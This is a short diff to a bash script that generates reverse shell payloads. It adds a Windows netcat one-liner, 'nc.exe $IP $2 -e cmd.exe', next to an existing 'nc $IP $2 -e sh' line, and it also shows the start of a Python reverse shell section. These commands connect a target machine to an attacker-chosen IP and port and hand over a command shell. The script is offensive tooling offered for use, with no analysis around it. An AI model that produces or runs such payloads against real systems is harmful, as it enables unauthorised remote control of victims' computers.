@@ -34,6 +34,7 @@ elif [[ "$1" == "nc" ]]; then
     echo -e "\n${BLUE}[+]${ENDCOLOR} Netcat reverse shell payloads generated:\n"
 
     echo -e "\t${YELLOW}-${ENDCOLOR} nc $IP $2 -e sh"
+    echo -e "\t${YELLOW}-${ENDCOLOR} nc.exe $IP $2 -e cmd.exe"
 
 elif [[ "$1" == "python" ]]; then
     echo -e "\n${BLUE}[+]${ENDCOLOR} Python reverse shell payloads generated:\n"
